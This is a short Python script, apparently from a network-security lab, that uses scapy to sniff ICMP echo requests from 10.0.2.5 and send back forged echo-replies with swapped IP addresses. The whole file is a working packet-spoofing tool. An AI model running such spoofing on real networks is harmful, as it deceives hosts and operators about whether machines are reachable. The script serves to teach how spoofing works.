#!/usr/bin/python3
from scapy.all import *

# handle the sniffed packet by spoofing it.
def spoofPacket(packet):
   print("Spoofing response to " + str(packet[IP].src) + " from " + str(packet[IP].dst))
   ip = IP(src = packet[IP].dst, dst = packet[IP].src)

   # construct ICMP layer using the same ID and sequence number. Set the type to "echo-reply".
   icmp = ICMP(type = "echo-reply", id = packet[ICMP].id, seq = packet[ICMP].seq)

   # construct a new packet using the IP and ICMP layers and keep the payload from the original packet
   newPacket = ip/icmp/packet[Raw].load
   send(newPacket, verbose = False)

# continually sniff the network
packet = sniff(filter = 'icmp and src host 10.0.2.5', prn = spoofPacket)
